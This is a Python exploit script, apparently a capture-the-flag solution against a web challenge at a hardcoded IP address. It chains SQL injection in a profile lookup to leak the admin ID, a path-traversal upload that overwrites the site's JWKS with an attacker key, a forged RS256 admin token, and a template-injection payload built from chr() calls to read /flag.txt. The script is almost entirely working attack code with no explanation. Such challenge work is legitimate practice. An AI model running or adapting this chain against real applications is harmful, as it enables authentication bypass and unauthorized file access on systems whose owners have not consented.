import base64
import json
import re
import secrets

import jwt
import requests
from cryptography.hazmat.primitives.asymmetric import rsa


BASE = "http://154.57.164.65:30235"
s = requests.Session()
username = "pwn_" + secrets.token_hex(4)
password = secrets.token_hex(8)

s.post(BASE + "/register", data={"username": username, "password": password}).raise_for_status()
r = s.post(BASE + "/login", data={"username": username, "password": password})
r.raise_for_status()

# The profile lookup interpolates this value directly into SQL.
r = s.post(BASE + "/profile", data={"token": "' OR role='admin'--"})
r.raise_for_status()
admin_id = re.search(r"User ID:</strong>\s*([^<\s]+)", r.text).group(1)
admin_name = re.search(r"Username:</strong>\s*([^<\s]+)", r.text).group(1)
print(f"[+] admin: {admin_name} / {admin_id}")

# Install an attacker-controlled key in the file-backed JWKS using upload traversal.
key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
pub = key.public_key().public_numbers()
b64 = lambda n: base64.urlsafe_b64encode(n.to_bytes((n.bit_length() + 7) // 8, "big")).rstrip(b"=").decode()
kid = secrets.token_hex(8)
jwks = {"keys": [{"kty": "RSA", "kid": kid, "use": "sig", "alg": "RS256", "n": b64(pub.n), "e": b64(pub.e)}]}
r = s.post(
    BASE + "/api/chat-messages",
    data={"message": "hello"},
    files={"attachment": ("../static/.well-known/jwks.json", json.dumps(jwks), "application/json")},
)
r.raise_for_status()
print("[+] replaced JWKS")

private_pem = key.private_bytes_raw() if False else None
from cryptography.hazmat.primitives import serialization
private_pem = key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption())
token = jwt.encode({"user_id": admin_id}, private_pem, algorithm="RS256", headers={"kid": kid})
s.cookies.clear()
s.cookies.set("auth_token", token)
r = s.get(BASE + "/admin/announcements")
print(f"[+] forged admin response: {r.status_code} {r.url}")

# Filtering removes dots/quotes/braces, so construct /flag.txt entirely with chr().
path_expr = "+".join(f"chr({ord(c)})" for c in "/flag.txt")
payload = f"<p tal:content='python:list(open({path_expr}))[0]'>x</p>"
r = s.post(BASE + "/api/announcements", data={"title": "status", "announcement": payload})
print(f"[+] SSTI response: {r.status_code} {r.text[:300]}")
r = s.get(BASE + "/announcements")
flags = re.findall(r"HTB\{[^}]+\}", r.text)
print("[+] flag:", flags[-1] if flags else "not found")
